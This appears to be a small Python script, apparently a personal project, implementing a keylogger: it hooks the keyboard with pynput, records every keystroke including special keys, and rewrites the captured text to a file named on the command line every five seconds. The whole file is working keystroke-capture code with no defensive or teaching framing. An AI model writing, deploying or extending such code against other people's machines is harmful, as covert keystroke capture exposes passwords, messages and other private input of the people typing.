#!/usr/bin/env python3
'''
Name : Alexis Rodriguez
Date : 2020-02-09
'''
from pynput import keyboard
import threading
import sys

log = ''

'''
Handles the action taken when a 
key is pressed.
'''
def on_press(key):
	global log
	try:
		log += str(key.char)
	# handling special characters
	except AttributeError:
		if key == key.space:
			log += ' '
		elif key == key.enter: log += '\n'
		elif key == key.backspace: log += ''
		elif key == key.ctrl: log += ' ctrl+'
		else:
			log += str(key)

'''
Logging to a file every 5 seconds
'''
def log_to_file():
	global log
	file_to_create = sys.argv[1]
	f = open(file_to_create, 'w')
	f.write(log)
	clock = threading.Timer(5, log_to_file)
	clock.start()

def main():
	global log
	# start the keylogger
	with keyboard.Listener(
		on_press=on_press) as listener:
		log_to_file()
		listener.join()

main()